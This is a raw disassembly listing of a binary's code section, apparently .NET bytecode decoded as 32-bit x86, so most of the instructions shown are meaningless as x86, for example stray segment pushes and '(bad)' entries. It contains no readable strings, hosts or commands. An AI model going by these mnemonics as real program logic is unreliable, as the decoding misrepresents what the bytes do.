  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 4e 21 00       	and    $0x214e72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 5c                	jb     0x4030d6
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 66 21 00       	and    $0x216672,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
